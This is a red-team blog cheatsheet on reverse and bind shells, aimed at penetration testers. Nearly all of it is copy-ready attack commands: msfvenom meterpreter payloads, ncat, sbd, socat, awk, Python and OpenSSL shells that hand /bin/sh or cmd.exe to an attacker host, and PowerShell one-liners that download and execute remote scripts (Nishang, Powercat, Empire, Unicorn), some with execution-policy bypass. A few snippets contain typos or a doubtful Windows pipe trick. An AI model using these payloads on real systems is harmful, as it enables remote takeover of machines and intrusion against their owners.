---
title: Remote Shell Cheatsheet
date: 2025-05-19 10:00 +0000
categories: [Blog, Cheatsheet]
tags: [shell, cheatsheet, cybersecurity, redteam, pentesting, linux, windows, pivoting]
author: z
---

This `cheatsheet` provides a comprehensive overview of reverse shell techniques, including command examples for both Linux and Windows environments. It serves as a quick reference for cybersecurity professionals engaged in red teaming and penetration testing, offering essential commands and methods for establishing reverse shells across different platforms.


> For an automatic `reverse Shell` generator you can use the [Reverse Shell Generator](https://www.revshells.com/) website. It provides a user-friendly interface to generate various reverse shell commands tailored to your needs.
{: .prompt-tip }


## What is a Reverse Shell?
First let's define what a reverse shell is. A reverse shell is a type of shell where the target machine opens a connection to the attacker's machine, allowing the attacker to execute commands on the target system. This is often used in penetration testing and red teaming scenarios to gain control over a compromised system.
## What is a Bind Shell?
A bind shell is a type of shell where the attacker opens a connection to the target machine, allowing the attacker to execute commands on the target system. This is often used in penetration testing and red teaming scenarios to gain control over a compromised system.

> **Note:** A reverse shell is a type of shell where the target machine opens a connection to the attacker's machine, but  a bind shell is a type of shell where the attacker opens a connection on the target machine and the attacket connects to the target machine.
{: .prompt-tip }

## Techniques

### MSFVenom
[MSFVenom](https://www.rapid7.com/blog/post/2011/05/24/introducing-msfvenom/) is a tool used to generate payloads for various platforms. It can be used to create reverse shell payloads that can be executed on the target machine.

#### List Payloads and Encoders
Check this:
```bash
msvenom -l payloads # For list Payloads
msvenom -l encoders # For list Encoders
```
> Payloads: To list for an especific OS use `grep <os_name>` 
```bash
msvenom -l payloads | grep windows
msvenom -l payloads | grep linux
msvenom -l payloads | grep osx
msvenom -l payloads | grep bsd
...
```
{: .prompt-tip }

#### Command Basic Format
```bash
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<Attacker_listen_port> -f <format> -o <output_file>
```
#### Bind Shell
```bash
# Windows
msfvenom -p windows/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<target_listen_port> -f exe -o <output_file.exe>

# Linux
msfvenom -p linux/<arch>/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<target_listen_port> -f elf -o <output_file>

```
#### Reverse Shell
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<Attacker_listen_port> -f exe -o <output_file.exe>

# Linux
msfvenom -p linux/<arch>/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<Attacker_listen_port> -f elf -o <output_file>
```
---

### Netcat
[Netcat](https://nmap.org/ncat/) is a command-line tool used for creating TCP and UDP connections. It can be used to create a reverse shell or Bind shell.

#### Reverse Shell
```bash
# Windows
ncat.exe -e cmd.exe <attacker_ip> <Attacker_listen_port> --ssl
# Linux
ncat -e /bin/sh <attacker_ip> <Attacker_listen_port> --ssl
```

#### Bind Shell
```bash
# Windows
ncat -l -p <listen_port> -e cmd.exe --ssl
# Linux
ncat -l -p <listen_port> -e /bin/sh --ssl
```

> Warning: `Ncat` is the newer version of NetCat and is more secure, that's why is has ssl support, in the oldest versions (`nc` and `nc.exe`) you can't use ssl. (just don't use `--ssl`), but is plain  text.
{: .prompt-warning }
---

### SBD
[SBD](https://gitlab.com/kalilinux/packages/sbd) is a NetCat-Clone, it's a simple and secure NetCat alternative designed to be portable and provides SSL support.

#### Reverse Shell
```bash
sbd -e bash <Attacker_IP> <Attacker_Port>
```

#### Bind Shell
```bash
sbd -l -p <port> -e bash
```


### Python

#### Reverse Shell
```bash
# Linux IPv4
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Linux IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

# Windows IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4343));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["cmd.exe"]);'

# Windows IPv6
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["cmd.exe"]);'
```

#### Bind Shell

```python
# Linux IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",4343));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Linux IPv6
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.bind(("[::]",4343));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Windows IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",4343));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["cmd.exe"])'

# Windows IPv6
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.bind(("[::]",4343));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["cmd.exe"])'
```

### Open SSL

#### Reverse Shell
##### Attacker Machine
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```

##### Target Machine
```bash
# Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

# Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

#### Bind Shell
##### Attacker  Machine
```bash
openssl s_client -connect <target_ip>:443
```

##### Target Machine
```bash
# Linux
mkfifo /tmp/ssl; /bin/sh -i < /tmp/ssl 2>&1 | openssl s_server -quiet -keyout key.pem -port 443 > /tmp/ssl
```
> Caution: This generates a temporary certificate each time, which can raise alerts in controlled environments.
{: .prompt-danger }

```bash
# Windows
certutil -f -decodehex "30820122300d06092a864886f70d01010105000382010f003082010a0282010100abcdeffedcba..." key.der >nul && certutil -encode key.der key.pem
# (This is just an example to generate a basic certificate; ideally, use openssl req manually if you have interactive access)
mklink \\.\pipe\sslpipe \\?\pipe\sslpipe
cmd.exe | openssl s_server -port 443 -quiet
```
> Note: Windows does not easily support FIFOs like Linux, so it is required to emulate the behavior with additional tools or scripts (for example, using PowerShell or Python + OpenSSL).
{: .prompt-info }


### PowerShell

```pwsh
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```

##### Oneliner
```pwsh
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
##### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang/tree/master/Shells)

```pwsh
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
##### PS-Powercat
[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
```pwsh
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
##### Empire
[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
Create a powershell launcher, save it in a file and download and execute it. (`Detected as malicious code`)
```pwsh
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
##### MSF-Unicorn
[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Create a `PwSh` version of metasploit backdoor using unicorn.
```bash
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Start msfconsole
```bash
msfconsole -r unicorn.rc
```
On target machine start a web server
```pwsh
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```

### AWK

`Linux Only`
#### Reverse Shell
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Socat
`socat` is a multipurpose tool for creating two-way tunnels between different types of flows (TCP, UDP, EXEC, FILE, etc.). It is especially useful in restricted environments and for advanced pivoting.

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
[https://sourceforge.net/projects/unix-utils/files/socat/](https://sourceforge.net/projects/unix-utils/files/socat/)

#### Reverse Shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

Linux victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
Windows victim> socat.exe TCP4:<attacker_ip>:1337 EXEC:powershell.exe,pty,stderr,sigint

# Limited PwSh access
Invoke-WebRequest -Uri http://<attacker>/socat.exe -OutFile $env:TEMP\socat.exe
Start-Process -FilePath "$env:TEMP\socat.exe" -ArgumentList "TCP4:<attacker_ip>:4444 EXEC:powershell.exe,pty,stderr,sigint"
```

#### Bind Shell
```bash
Linux victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
Windows victim> socat.exe TCP-LISTEN:1337,reuseaddr,fork EXEC:powershell.exe,pty,stderr,sigint

attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

## References
- [Reverse Shell Generator](https://www.revshells.com/)
- [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Socat](https://www.socat.org/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Hacktricks](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/)
